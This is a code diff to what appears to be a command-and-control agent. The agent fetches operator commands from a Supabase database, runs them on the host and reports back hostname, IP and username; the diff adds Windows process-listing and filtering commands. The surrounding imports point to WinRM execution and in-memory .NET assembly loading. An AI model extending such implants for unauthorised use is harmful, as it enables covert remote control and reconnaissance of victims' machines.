@@ -13,6 +13,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.winrm_execute import winrm_execute  # Import the winrm_execute function
     from utils.winapi.pwd import wpwd  # Import the wpwd function
     from utils.winapi.wami import wami  # Import the wami function
+    from utils.winapi.ps import list_processes, grep_processes  # Import ps functions
     from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
 
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
@@ -87,6 +88,29 @@ def execute_commands(supabase: Client):
                 try:
                     path = command_text.split(' ', 1)[1]  # Expecting command to be in format "ls [path]"
                     result = ls(path)
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+
+            # Handle 'ps' command only if on Windows
+            elif os.name == 'nt' and command_text.lower() == 'ps':
+                try:
+                    result = list_processes()
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+
+            # Handle 'ps grep' command only if on Windows
+            elif os.name == 'nt' and command_text.lower().startswith('ps grep'):
+                try:
+                    pattern = command_text.split(' ', 2)[2]  # Expecting command to be in format "ps grep [pattern]"
+                    result = grep_processes(pattern)
                     status = 'Completed'
                     output = "\n".join(result)
                 except Exception as e:
